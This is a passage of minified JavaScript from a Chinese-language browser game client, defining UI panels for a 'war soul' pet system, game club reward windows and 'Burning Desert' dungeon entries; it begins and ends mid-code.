l=o.DisplayUtils.getPolygonVertex(this.imgAbility.x+this.imgAbility.width/2,this.imgAbility.y+this.imgAbility.height/2,this.imgAbility.width/2,4,e);o.DisplayUtils.drawPolygon(this.abShape,l,4251448)}},e.prototype.removeDisplay=function(){},e.prototype.updateView=function(){this.info&&(this.txtName.text=this.info.name,this.txtLevel.text=gettext("等级:")+this.info.level,this.imgQua.source=this.info.getQualityImg(),this.updateTabView(),this.setAbility())},e.prototype.onBtnTouch=function(t){switch(t.target){case this.closeBtn:win.close(this);break;case this.leftBtn:this.infoIdx--,this.infoIdx<0&&(this.infoIdx=u.WarSoulCT.ins().warSoulList.length-1),this.updateInfo();break;case this.rightBtn:this.infoIdx++,this.infoIdx>u.WarSoulCT.ins().warSoulList.length-1&&(this.infoIdx=0),this.updateInfo();break;case this.btnChange:win.open("RenameWin",1,this.info.id)}},e.prototype.updateInfo=function(){var t=u.WarSoulCT.ins().warSoulList;this.info!=t[this.infoIdx]&&(this.info=t[this.infoIdx],u.WarSoulCT.ins().curSelWarSoulId=this.info.id,this.updateModel(),this.updateView())},e.prototype.updateTabView=function(){switch(this.tab.selectedIndex){case 0:this.warSoulInfoPanel.setInfo(this.info);break;case 1:this.warSoulLvUpPanel.setInfo(this.info);break;case 2:this.warSoulSkillPanel.setInfo(this.info)}},e.prototype.onTabChange=function(t){this.updateTabView()},e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=l.OpenSystem.ins().checkSysOpen(r.SystemType.WarSoul);return i||h.TipsCT.ins().showTips(l.OpenSystem.ins().getNoOpenTips(r.SystemType.WarSoul)),i},e}(s.BaseView);e.WarSoulWindow=p,window.WarSoulWindow=p,__reflect(p.prototype,"WarSoulWindow",[]),window.WarSoulWindow=p},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.WarSoulWarnWin=void 0;var n=i(1),o=i(77),s=i(0),a=i(60),r=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="WarSoulWarnSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.itemList.itemRenderer=o.ItemBaseNoName,this.addTouchEvent(this,this.onTap)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];if(this.curInfo=t[0],this.curInfo){var i=s.GlobalConfig.WarSoulLvConfig[this.curInfo.level],n=i?i.restore:[];this.itemList.dataProvider=new eui.ArrayCollection(n),this.warnLabel.text=gettext("重置后战灵将恢复1级，返还全部材料，是否确认?")}},e.prototype.onTap=function(t){switch(t.target){case this.sureBtn:a.WarSoulCT.ins().sendWarSoulRestore(a.WarSoulCT.ins().curSelWarSoulId),win.close(this);case this.notBtn:win.close(this)}},e.prototype.removeDisplay=function(){this.skin&&this.removeObserve()},e}(n.BaseView);e.WarSoulWarnWin=r,window.WarSoulWarnWin=r,__reflect(r.prototype,"WarSoulWarnWin",[]),window.WarSoulWarnWin=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.WarSoulSkillPanel=void 0;var n=i(19),o=i(1),s=i(110),a=i(0),r=i(39),l=i(15),h=i(6),u=i(12),p=i(2),d=i(27),c=i(266),f=i(267),g=i(60),m=function(t){function e(){var e=t.call(this)||this;return e._sn_="WarSoulSkillPanelSkin",e.costObjArr=[],e}return __extends(e,t),e.prototype.skinComplete=function(){this.curSkillList.itemRenderer=f.WarSoulSkillItem,this.proSkillList.itemRenderer=f.WarSoulSkillItem,this.itemList.itemRenderer=c.WarSoulSkillBookItem,this.costCmlist.itemRenderer=s.CostComRender,this.curSkillList.dataProvider=this.eCurSkillArc=new eui.ArrayCollection,this.proSkillList.dataProvider=this.eProSkillArc=new eui.ArrayCollection,this.itemList.dataProvider=this.eItemlArc=new eui.ArrayCollection,this.costCmlist.dataProvider=this.costArc=new eui.ArrayCollection},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];g.WarSoulCT.ins().lockSkillIdList=[],this.itemList.addEventListener(eui.ItemTapEvent.ITEM_TAP,this.onItemClick,this),this.curSkillList.addEventListener(eui.ItemTapEvent.ITEM_TAP,this.onSkillItemClick,this),this.addTouchEvent(this,this.onTap),this.observe(g.WarSoulCT.ins().postWarSoulLearnSkill,this.updateView),this.observe(h.BagCT.ins().postItemAdd,this.updateItemList),this.observe(h.BagCT.ins().postItemChange,this.updateItemList),this.observe(h.BagCT.ins().postItemDel,this.updateItemList),this.updateView()},e.prototype.setInfo=function(t){this.info=t,g.WarSoulCT.ins().lockSkillIdList=[],this.skin&&this.updateView()},e.prototype.updateView=function(){for(var t=[],e=0;e<this.info.proSkillList.length;e++){var i={id:this.info.proSkillList[e],isPro:!0};t.push(i)}this.eProSkillArc.source=t;for(var n=[],o=this.info.cfg.skillMax,e=0;o>e;e++)if(this.info.skillList[e]){var i={id:this.info.skillList[e],isPro:!1};n.push(i)}else n.push(0);this.eCurSkillArc.source=n,this.updateListLock(),this.updateItemList(),this.updateCost()},e.prototype.updateItemList=function(){for(var t=h.BagCT.ins().getBagGoodsByType(r.ItemType.TYPE_54),e=this.info.proSkillList.concat(this.info.skillList),i=0,n=e;i<n.length;i++){var o=n[i],s=a.GlobalConfig.WarSoulSkillConfig[o];if(s&&s.bookId)for(var l=0;l<t.length;l++){var u=t[l];if(u&&u.configID==s.bookId){t.splice(l,1),l--;break}}}this.eItemlArc.replaceAll(t)},e.prototype.updateItemSelected=function(){for(var t=0;t<this.itemList.numChildren;t++){var e=this.itemList.getChildAt(t);e.isOpenSelectImg=!0,e.updateSelect()}},e.prototype.updateListLock=function(){for(var t=0;t<this.curSkillList.numChildren;t++){var e=this.curSkillList.getChildAt(t);e.setLockShow(!0)}},e.prototype.updateCost=function(){for(var t=0;t<this.curSkillList.numChildren;t++){var e=this.curSkillList.getChildAt(t);e.updateLock()}var i=g.WarSoulCT.ins().lockSkillIdList.length,n=g.WarSoulCT.ins().getLockCost(i);a.GlobalConfig.WarSoulLvConfig[this.info.level];if(this.costObjArr=[],n){for(var o=0,s=n;o<s.length;o++){var r=s[o];this.costObjArr.push({cost:{type:r.type,id:r.id,count:r.count},isShowXh:!1,isShowHas:!0})}this.costArc.replaceAll(this.costObjArr)}this.costCmlist.visible=!!this.costObjArr.length;var l=g.WarSoulCT.ins().getCanLockSkillNum(this.info.id);this.lb_costItemName.text=gettext("当前锁定技能{0}",i+"/"+l)},e.prototype.onItemClick=function(t){if(t){var e=t.itemRenderer;e&&e.data&&(g.WarSoulCT.ins().curSelSkillBookId=e.data.configID)}this.updateItemSelected()},e.prototype.onSkillItemClick=function(t){this.updateCost()},e.prototype.onTap=function(t){var e,i=this;switch(t.target){case this.btnStudy:if(!g.WarSoulCT.ins().curSelSkillBookId)return void p.TipsCT.ins().showTips(gettext("请先选择技能书"));for(var o=0,s=this.costObjArr;o<s.length;o++){var r=s[o];if(!n.GlobalFun.checkCost(r.cost.count,r.cost.id))return}for(var l=this.info.proSkillList.concat(this.info.skillList),h=0,u=l;h<u.length;h++){var c=u[h],f=a.GlobalConfig.WarSoulSkillConfig[c];if(f&&f.bookId==g.WarSoulCT.ins().curSelSkillBookId)return void p.TipsCT.ins().showTips(gettext("该战灵技能已学习"))}d.WarnWin.show(gettext("每次学习有概率学习到新的格子上，也可能覆盖老的任意通用技能，是否学习?"),function(){g.WarSoulCT.ins().sendWarSoulLearnSkill(i.info.id,g.WarSoulCT.ins().curSelSkillBookId,g.WarSoulCT.ins().lockSkillIdList)},this);break;case this.txt_decomp0:case this.btn_help0:win.open("CommonHelpWin",(null===(e=a.GlobalConfig.HelpInfoConfig[350])||void 0===e?void 0:e.text)||"")}},e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=u.OpenSystem.ins().checkSysOpen(l.SystemType.WarSoul);return i||p.TipsCT.ins().showTips(u.OpenSystem.ins().getNoOpenTips(l.SystemType.WarSoul)),i},e.prototype.removeDisplay=function(){},__decorate([delayCall(200)],e.prototype,"updateListLock",null),__decorate([delayCall(200)],e.prototype,"updateCost",null),e}(o.BaseView);e.WarSoulSkillPanel=m,window.WarSoulSkillPanel=m,__reflect(m.prototype,"WarSoulSkillPanel",[]),window.WarSoulSkillPanel=m},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.WarSoulSwallowPanel=void 0;var n=i(21),o=i(1),s=i(0),a=i(15),r=i(12),l=i(2),h=i(525),u=i(526),p=i(60),d=function(t){function e(){var e=t.call(this)||this;return e._sn_="WarSoulSwallowPanelSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.eList.itemRenderer=u.WarSoulSwaItem,this.eList.dataProvider=this.eArc=new eui.ArrayCollection([]),this.eAttrList.itemRenderer=h.WarSoulSwaAttrItem,this.eAttrList.dataProvider=this.eAttrArc=new eui.ArrayCollection([])},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];p.WarSoulCT.ins().selSwaMainInfo=null,p.WarSoulCT.ins().selSwaFuInfo=null,this.addTouchEvent(this,this.onTap),this.eList.addEventListener(eui.ItemTapEvent.ITEM_TAP,this.onListTap,this),this.observe(p.WarSoulCT.ins().postWarSoulEat,this.onWarSoulEat),this.updateSoul(null),this.updateSoulFu(null),this.updateView()},e.prototype.onWarSoulEat=function(){this.updateSoul(p.WarSoulCT.ins().selSwaMainInfo),this.updateSoulFu(null),this.updateView()},e.prototype.updateView=function(){this.updateList(),this.updateAttrList()},e.prototype.updateList=function(){var t=p.WarSoulCT.ins().getWarSoulInfoList();this.eArc.replaceAll(t)},e.prototype.updateAttrList=function(){for(var t=[],e=1;4>=e;e++)t.push({attrId:e,mainInfo:p.WarSoulCT.ins().selSwaMainInfo,fuInfo:p.WarSoulCT.ins().selSwaFuInfo});this.eAttrArc.replaceAll(t),this.btnCancel.visible=!!p.WarSoulCT.ins().selSwaMainInfo,this.btnCancelFu.visible=!!p.WarSoulCT.ins().selSwaFuInfo;for(var e=0;e<this.eList.numChildren;e++){var i=this.eList.getChildAt(e);i.updateSelectState()}},e.prototype.updateSoul=function(t){if(p.WarSoulCT.ins().selSwaMainInfo=t,!p.WarSoulCT.ins().selSwaMainInfo)return this.imgAdd.visible=!0,this.txtName.text="",void this.updateModel(null);this.imgAdd.visible=!1,this.txtName.text=t.name;var e=s.GlobalConfig.WarSoulConfig[t.cfgId];this.updateModel(e)},e.prototype.updateModel=function(t){if(!t||!t.modelId)return void(this.effWarSoul&&(this.effWarSoul.visible=!1));this.effWarSoul||(this.effWarSoul=new n.MovieClip,this.modelGrp.addChild(this.effWarSoul)),this.effWarSoul.scaleX=this.effWarSoul.scaleY=p.WarSoulCT.ins().getWarSoulModelSet(t),this.effWarSoul.visible=!0;var e=t.modelId+"_4s";this.effWarSoul.playFile(RES_DIR_MONSTER+e,-1,null,!1)},e.prototype.updateModelFu=function(t){if(!t||!t.modelId)return void(this.effWarSoulFu&&(this.effWarSoulFu.visible=!1));this.effWarSoulFu||(this.effWarSoulFu=new n.MovieClip,this.modelGrpFu.addChild(this.effWarSoulFu)),this.effWarSoulFu.scaleX=this.effWarSoulFu.scaleY=p.WarSoulCT.ins().getWarSoulModelSet(t),this.effWarSoulFu.visible=!0;var e=t.modelId+"_4s";this.effWarSoulFu.playFile(RES_DIR_MONSTER+e,-1,null,!1)},e.prototype.updateSoulFu=function(t){if(p.WarSoulCT.ins().selSwaFuInfo=t,!p.WarSoulCT.ins().selSwaFuInfo)return this.imgAddFu.visible=!0,this.txtNameFu.text="",void this.updateModelFu(null);this.imgAddFu.visible=!1,this.txtNameFu.text=t.name;var e=s.GlobalConfig.WarSoulConfig[t.cfgId];this.updateModelFu(e)},e.prototype.onListTap=function(t){var e=t.item;!e||p.WarSoulCT.ins().selSwaMainInfo&&p.WarSoulCT.ins().selSwaFuInfo||p.WarSoulCT.ins().selSwaMainInfo&&p.WarSoulCT.ins().selSwaMainInfo.id==e.id||p.WarSoulCT.ins().selSwaFuInfo&&p.WarSoulCT.ins().selSwaFuInfo.id==e.id||(p.WarSoulCT.ins().selSwaMainInfo?p.WarSoulCT.ins().selSwaFuInfo||this.updateSoulFu(e):this.updateSoul(e),this.updateAttrList())},e.prototype.onTap=function(t){var e;switch(t.target){case this.btnCancel:this.updateSoul(null),this.updateAttrList();break;case this.btnCancelFu:this.updateSoulFu(null),this.updateAttrList();break;case this.btnSwallow:if(!p.WarSoulCT.ins().selSwaMainInfo)return void l.TipsCT.ins().showTips(gettext("请选择要吞噬的主战灵"));if(!p.WarSoulCT.ins().selSwaFuInfo)return void l.TipsCT.ins().showTips(gettext("请选择要吞噬的副战灵"));if(p.WarSoulCT.ins().selSwaFuInfo.id==p.WarSoulCT.ins().curWarSoulId||p.WarSoulCT.ins().selSwaFuInfo.level>1)return void l.TipsCT.ins().showTips(gettext("要吞噬的副战灵要先下阵、重置成1级"));for(var i=!1,n=1;4>=n;n++){var o=p.WarSoulCT.ins().selSwaMainInfo.attr[n]?p.WarSoulCT.ins().selSwaMainInfo.attr[n].qlty:0,a=p.WarSoulCT.ins().selSwaFuInfo.attr[n]?p.WarSoulCT.ins().selSwaFuInfo.attr[n].qlty:0;if(a>o){i=!0;break}}if(!i)return void l.TipsCT.ins().showTips(gettext("要吞噬的副战灵需要有资质大于主战灵的资质"));p.WarSoulCT.ins().sendWarSoulEat(p.WarSoulCT.ins().selSwaMainInfo.id,p.WarSoulCT.ins().selSwaFuInfo.id);break;case this.btn_help0:win.open("CommonHelpWin",(null===(e=s.GlobalConfig.HelpInfoConfig[349])||void 0===e?void 0:e.text)||"")}},e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=r.OpenSystem.ins().checkSysOpen(a.SystemType.WarSoul);return i||l.TipsCT.ins().showTips(r.OpenSystem.ins().getNoOpenTips(a.SystemType.WarSoul)),i},e.prototype.removeDisplay=function(){},e}(o.BaseView);e.WarSoulSwallowPanel=d,window.WarSoulSwallowPanel=d,__reflect(d.prototype,"WarSoulSwallowPanel",[]),window.WarSoulSwallowPanel=d},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GameClubOCWin=void 0;var n=i(1),o=i(119),s=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="gameclubSkin",e.evsIdx=0,e}return __extends(e,t),e.prototype.skinComplete=function(){this.addChangeEvent(this.eTab,this.onTabTouch)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];t[0]&&(this.evsIdx=t[0]),this.initTab(),observe(this,this.updateTabRp,o.GameclubCT.ins().postGameclubInfo),this.updateTabRp(),Timer.start(2e3,-1,this.updateTabRp,this)},e.prototype.removeDisplay=function(){this.removeObserve(),Timer.stopAll(this)},e.prototype.updateTabRp=function(){var t;null===(t=this.eTab)||void 0===t?void 0:t.updateReds()},e.prototype.initTab=function(){},e.prototype.onTabTouch=function(){this.evsIdx!=this.eTab.selectedIndex&&(this.evsIdx=this.eTab.selectedIndex)},e.prototype.tabRp=function(){return o.GameclubCT.ins().returnFirstRed()||o.GameclubCT.ins().returnSignInRed()||o.GameclubCT.ins().returnTaskRed()},e}(n.BaseView);e.GameClubOCWin=s,window.GameClubOCWin=s,__reflect(s.prototype,"GameClubOCWin",[]),window.GameClubOCWin=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GameClubRule=void 0;var n=i(17),o=i(41),s=i(527),a=i(119),r=function(t){function e(e){var i=t.call(this,e)||this;return i.cfg=e,i.showMsg([n.RedPointBaseSys.ins().RpChange,a.GameclubCT.ins().postGameclubInfo]),i}return __extends(e,t),e.prototype.checkShow=function(){var t=urlParam.isGameClub;return t&&(this.redPoint=a.GameclubCT.ins().returnFirstRed()||a.GameclubCT.ins().returnSignInRed()||a.GameclubCT.ins().returnTaskRed()),t},e.prototype.tapEvt=function(){win.open(s.GameClubWin)},e}(o.PayfunIconData);e.GameClubRule=r,window.GameClubRule=r,__reflect(r.prototype,"GameClubRule",[]),window.GameClubRule=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GameclubComShareWin=void 0;var n=i(1),o=i(0),s=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="gameclubComShareSkin",e.clubType=1,e}return __extends(e,t),e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.GameclubComTVData()},e.prototype.GameclubComTVData=function(){var t=o.GlobalConfig.GameClubwebConfig;if(t&&t[this.clubType]){var e=t[this.clubType];this.descs.text=e.toptip,this.descs0.text=e.tip,this.conIcon.source=e.qrimg}},e}(n.BaseView);e.GameclubComShareWin=s,window.GameclubComShareWin=s,__reflect(s.prototype,"GameclubComShareWin",[]),window.GameclubComShareWin=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GameclubComTVWin=void 0;var n=i(1),o=i(0),s=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="gameclubComShareSkin",e.clubType=2,e}return __extends(e,t),e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.GameclubComTVData()},e.prototype.GameclubComTVData=function(){var t=o.GlobalConfig.GameClubwebConfig;if(t&&t[this.clubType]){var e=t[this.clubType];this.descs.text=e.toptip,this.descs0.text=e.tip,this.conIcon.source=e.qrimg}},e}(n.BaseView);e.GameclubComTVWin=s,window.GameclubComTVWin=s,__reflect(s.prototype,"GameclubComTVWin",[]),window.GameclubComTVWin=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GameclubFirstWin=void 0;var n=i(1),o=i(11),s=i(0),a=i(119),r=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="gameclubFirstWinSkin",e.type=1,e}return __extends(e,t),e.prototype.skinComplete=function(){this.eList.itemRenderer=o.ItemBase,this.eList.dataProvider=this.eData=new eui.ArrayCollection},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.setFirstGetData(),this.addTouchEvent(this.btnGet,this.touchGetTaskAward),observe(this,this.setFirstGetData,a.GameclubCT.ins().postGameclubInfo)},e.prototype.setFirstGetData=function(){var t=[],e=s.GlobalConfig.GameClubBaseConfig;if(e)for(var i in e.reward)t.push(e.reward[i]);if(this.eData.source=t,this.eData.refresh(),1==a.GameclubCT.ins().isFirstAward)this.btnGet.label=gettext("已领取"),this.btnGet.enabled=!1,this.btnGet.eRp.visible=!1;else{var n=e.task,o=!0;for(var i in n)a.GameclubCT.ins().returnIsGo(n[i].id,n[i].count)||(o=!1);o?(this.btnGet.label=gettext("领 奖"),this.btnGet.enabled=!0,this.btnGet.eRp.visible=!0):(this.btnGet.label=gettext("未完成"),this.btnGet.enabled=!1,this.btnGet.eRp.visible=!1)}},e.prototype.touchGetTaskAward=function(){a.GameclubCT.ins().sendGameclubAward(this.type,0)},e.prototype.tabRp=function(){return a.GameclubCT.ins().returnFirstRed()},e}(n.BaseView);e.GameclubFirstWin=r,window.GameclubFirstWin=r,__reflect(r.prototype,"GameclubFirstWin",[]),window.GameclubFirstWin=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GameclubOCSignInWin=void 0;var n=i(1),o=i(0),s=i(119),a=i(528),r=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="gameclubOCSignInSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.eList.itemRenderer=a.GameclubOCSignInItem,this.eList.dataProvider=this.eData=new eui.ArrayCollection,observe(this,this.setSignInData,s.GameclubCT.ins().postGameclubInfo)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.setSignInData()},e.prototype.setSignInData=function(){var t=[],e=o.GlobalConfig.GameClubSignInConfig;if(e)for(var i in e)t.push(e[i]);this.eData.source=t,this.eData.refresh(),this.day.text=gettext(s.GameclubCT.ins().loggedDays+"天")},e.prototype.tabRp=function(){return s.GameclubCT.ins().returnSignInRed()},e}(n.BaseView);e.GameclubOCSignInWin=r,window.GameclubOCSignInWin=r,__reflect(r.prototype,"GameclubOCSignInWin",[]),window.GameclubOCSignInWin=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GameclubOCTaskWin=void 0;var n=i(1),o=i(0),s=i(119),a=i(529),r=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="gameclubOCTaskSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.eList.itemRenderer=a.GameclubOCTaskItem,this.eList.dataProvider=this.eData=new eui.ArrayCollection,observe(this,this.setTaskData,s.GameclubCT.ins().postGameclubInfo)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.setTaskData()},e.prototype.setTaskData=function(){var t=[],e=o.GlobalConfig.GameClubTaskConfig;if(e)for(var i in e)t.push(e[i]);this.eData.source=t,this.eData.refresh()},e.prototype.tabRp=function(){return s.GameclubCT.ins().returnTaskRed()},e}(n.BaseView);e.GameclubOCTaskWin=r,window.GameclubOCTaskWin=r,__reflect(r.prototype,"GameclubOCTaskWin",[]),window.GameclubOCTaskWin=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.WxGameCustomRule=void 0;var n=i(41),o=function(t){function e(e){var i=t.call(this,e)||this;return i.cfg=e,i.showMsg([]),i}return __extends(e,t),e.prototype.checkShow=function(){var t=urlParam.isShowWxCustomerService;return t},e.prototype.tapEvt=function(){platform.getOpenCustomerServiceConversation()},e}(n.PayfunIconData);e.WxGameCustomRule=o,window.WxGameCustomRule=o,__reflect(o.prototype,"WxGameCustomRule",[]),window.WxGameCustomRule=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ShareLvData=void 0;var n=function(){function t(t){var e;this.id=t.readInt(),this.roleName=t.readString(),e=t.readInts(3),this.sex=e[0],this.job=e[1],this.state=e[2]}return t}();e.ShareLvData=n,window.ShareLvData=n,__reflect(n.prototype,"ShareLvData",[]),window.ShareLvData=n},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.BurningDesertMainView=void 0;var n=i(16),o=i(1),s=i(0),a=i(68),r=i(1374),l=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._fbArr=[],e}return __extends(e,t),e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this._fbArr=[];for(var i in s.GlobalConfig.HotDesertFbConfig)this._fbArr.push(s.GlobalConfig.HotDesertFbConfig[i]);this.initFbList()},e.prototype.initFbList=function(){for(;this.fbGrp.numChildren>0;)this.fbGrp.removeChildAt(0);for(var t=0,e=this._fbArr.length;e>t;t++){var i=this._fbArr[t],n=new r.BurningDesertFbItem;n.setData(i),this.fbGrp.addChild(n)}},e.prototype.removeDisplay=function(){if(this.skin)for(var t=this.fbGrp.numElements-1;t>-1;){var e=this.fbGrp.getElementAt(t);e&&(e.clearAll(),n.DisplayUtils.removeFromParent(e)),t--}},e.prototype.tabRp=function(){return a.CrossDartCarCT.ins().isOpening},e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];return!0},e}(o.BaseView);e.BurningDesertMainView=l,window.BurningDesertMainView=l,__reflect(l.prototype,"BurningDesertMainView",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.BurningDesertFbItem=void 0;var n=i(21),o=i(3),s=i(82),a=i(258),r=i(12),l=i(2),h=i(75),u=i(268),p=i(265),d=i(8),c=i(0),f=i(7),g=i(18),m=i(367),v=i(68),y=i(192),C=function(t){function e(){var e=t.call(this)||this;return e._sn_="ChiReHuangMofbitemskin",e._isInit=!1,e.widthV=0,e}return __extends(e,t),e.prototype.skinComplete=function(){this.widthV=this.width,this._isInit=!0,this.Times.text="",this.setData(this._cfg),this.addEvent(egret.TouchEvent.TOUCH_TAP,this,this.onClickHandler),this.judgeTimesInit()},e.prototype.setData=function(t){this._cfg=t,this._isInit&&this._cfg&&(this._eff||(this._eff=new n.MovieClip,this.effGrp.addChild(this._eff)),this._eff.playFile(""+RES_DIR_EFF+this._cfg.eff,-1),this.eTitle.source=this._cfg.pic,this.x=this._cfg.showPos[0],this.y=this._cfg.showPos[1],this._cfg.id==h.HotDesertFbEnum.CrossDartCar?this.eRp.visible=v.CrossDartCarCT.ins().isOpening:this.eRp.visible=!1)},e.prototype.onClickHandler=function(){if(console.log("---click burningDesert item---"),!r.OpenSystem.ins().checkSysOpen(this._cfg.openId))return void l.TipsCT.ins().showTips(r.OpenSystem.ins().getNoOpenTips(this._cfg.openId));if(this._cfg.id==h.HotDesertFbEnum.ShiKongZhiJing)win.open(u.ShiKongZhiJingFbView,0,1,this._cfg);else if(this._cfg.id==h.HotDesertFbEnum.Invade){if(-1==s.InvadeCT.ins().tarSerId)return void l.TipsCT.ins().showTips(gettext("活动未开启"));win.open(a.InvadeWin)}else this._cfg.id==h.HotDesertFbEnum.SixReincarnations?win.open(p.SixreincarnationsWin):this._cfg.id==h.HotDesertFbEnum.CrossDartCar?win.open(m.CrossDartCarMapWin):this._cfg.id==h.HotDesertFbEnum.StarDomain&&win.open(y.StardomainWin)},e.prototype.judgeTimesInit=function(){this._cfg.id==h.HotDesertFbEnum.SixReincarnations?(this.Times.visible=!0,this.t=d.DateUtils.countNextWeekTimes(c.GlobalConfig.SixUndergroundPalacesBaseConfig.settlementDate[0],c.GlobalConfig.SixUndergroundPalacesBaseConfig.settlementDate[1],c.GlobalConfig.SixUndergroundPalacesBaseConfig.settlementDate[2]),this.timeFun(),Timer.start(1e3,0,this.timeFun,this)):this.Times.visible=!1},e.prototype.timeFun=function(){var t=this.t-f.GameServerCC.serverTime/1e3;if(0>=t)return Timer.stop(this.timeFun,this),void(this.Times.text=c.GlobalConfig.SixUndergroundPalacesBaseConfig.openTTxt);var e=d.DateUtils.getFormatBySecond(t,d.DateUtils.TIME_FORMAT_5,4);this.Times.text=e+gettext("后重置"),this.Times.textColor=g.ColorUtil.RED_COLOR_N,this.widthV<this.Times.width&&(this.widthV=this.Times.width),this.width=this.widthV
},e.prototype.clearAll=function(){Timer.stopAll(this),(null===this||void 0===this?void 0:this._eff)&&this._eff.stop(),this.Times.text=""},e}(o.BaseItemRender);e.BurningDesertFbItem=C,window.BurningDesertFbItem=C,__reflect(C.prototype,"BurningDesertFbItem",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ShikongzhijingTypeitem=void 0;var n=i(3),o=function(t){function e(){var e=t.call(this)||this;return e._sn_="shikongzhijingTypeitemskin",e}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.dataChanged=function(){var t=this.data,e=t.type,i=t.isSel;this.type=e,this.currentState=i?"down":"up",this.icon.source=i?"biaoti_json.fb_burningType"+e+"_1":"biaoti_json.fb_burningType"+e},e}(n.BaseItemRender);e.ShikongzhijingTypeitem=o,window.ShikongzhijingTypeitem=o,__reflect(o.prototype,"ShikongzhijingTypeitem",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.Shikongzhijingitem=void 0;var n=i(3),o=i(0),s=function(t){function e(){var e=t.call(this)||this;return e._sn_="shikongzhijingitemskin",e}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.dataChanged=function(){this._info=this.data;var t=this.data,e=t.cfg,i=t.isSel;if(this._cfg=e,this._isSel=i,this.currentState=this._isSel?"down":"up",this._cfg){var n=o.GlobalConfig.MonstersConfig[this._cfg.bossId];n&&(this.boss.text=n.name,this.iconDisplay.source="monhead"+n.head+"_png")}},e}(n.BaseItemRender);e.Shikongzhijingitem=s,window.Shikongzhijingitem=s,__reflect(s.prototype,"Shikongzhijingitem",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.BurningDesertRoomMemberItem=void 0;var n=i(3),o=i(2),s=i(0),a=i(10),r=i(4),l=i(75),h=i(531),u=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="teamFbRoleItem",e}return __extends(e,t),e.prototype.skinComplete=function(){this.addTouchEvent(this.invite,this.onTouch),this.addTouchEvent(this.nomember,this.onTouch),this.addTouchEvent(this.rolegroup,this.onTouch)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.dataChanged(),this.grpPower.visible=!0},e.prototype.onTouch=function(t){switch(t.target){case this.invite:case this.nomember:var e=l.BurningDesertCT.ins().checkMeIsLeader();if(!e)return void o.TipsCT.ins().showTips(gettext("队长才能邀请玩家"));l.BurningDesertCT.ins().postOpenInviteView();break;case this.rolegroup:this._memberVo.roleId!=r.ActorCC.actorID&&win.open(h.BurningDesertMemberInfoWin,this._memberVo)}},e.prototype.dataChanged=function(){this.skin&&(this._memberVo=this.data,this._memberVo?(this.rolegroup.visible=!0,this.nomember.visible=this.invite.visible=!1,this.position.visible=!0,this.showRole(this._memberVo),this.lab.visible=!1,this.position.source=1==this._memberVo.leaderStatus?"road_leader":"",this.grpPower.visible=!0,this.ePow.text=this._memberVo.power+""):(this.nomember.visible=this.invite.visible=!0,this.position.visible=!1,this.lab.visible=!0,this.rolegroup.visible=!1,this.grpPower.visible=!1))},e.prototype.showRole=function(t){if(t&&(this.eIcon.source="yuanhead"+t.job+t.sex,this.lb_lv.text=t.lv+"",this.eNameLab.text=t.playerName,this.eTitleGrp.visible=!!t.titleId,this.eTitleGrp.visible)){var 